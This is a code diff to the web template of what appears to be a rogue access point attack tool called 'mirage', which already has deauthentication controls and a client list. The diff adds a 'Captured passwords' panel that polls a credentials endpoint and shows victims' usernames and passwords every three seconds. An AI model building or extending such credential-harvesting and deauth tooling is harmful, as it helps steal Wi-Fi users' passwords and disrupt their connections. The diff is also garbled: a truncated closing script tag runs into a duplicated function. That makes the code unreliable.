@@ -87,6 +87,12 @@
         <div class="cempty" id="cempty">No client connected yet.</div>
       </div>
 
+      <div class="clients" style="margin-top:10px;">
+        <div class="clients-head">Captured passwords <span id="pcount">0</span></div>
+        <div id="plist"></div>
+        <div class="cempty" id="pempty">No passwords captured yet.</div>
+      </div>
+
       <div class="deauth">
         {% if deauth_active %}
           <a class="btn stop" href="/mirage/deauth/stop">Stop deauth</a>
@@ -158,6 +164,43 @@
       }
       refresh();
       setInterval(refresh, 3000);
+    })();
+  </scfunction refresh() {
+        fetch('/mirage/clients', { cache: 'no-store' })
+          .then(function (r) { return r.json(); })
+          .then(function (cs) {
+            count.textContent = cs.length;
+            empty.style.display = cs.length ? 'none' : 'block';
+            list.innerHTML = cs.map(function (c) {
+              return '<div class="cli"><span class="cn">' +
+                     esc(c.name || c.mac) + '</span><span class="cip">' +
+                     esc(c.ip) + '</span></div>';
+            }).join('');
+          })
+          .catch(function () {});
+      }
+
+      function refreshPasswords() {
+        fetch('/mirage/credentials', { cache: 'no-store' })
+          .then(function(r) { return r.json(); })
+          .then(function(cs) {
+            var pcount = document.getElementById('pcount');
+            var plist = document.getElementById('plist');
+            var pempty = document.getElementById('pempty');
+            if (!plist) return;
+            pcount.textContent = cs.length;
+            pempty.style.display = cs.length ? 'none' : 'block';
+            plist.innerHTML = cs.map(function(c) {
+              return '<div class="cli"><span class="cn">' + esc(c.username || '') + '</span><span class="cip">' + esc(c.password) + '</span></div>';
+            }).join('');
+          })
+          .catch(function() {});
+      }
+
+      refresh();
+      refreshPasswords();
+      setInterval(refresh, 3000);
+      setInterval(refreshPasswords, 3000);
     })();
   </script>
   {% endif %}
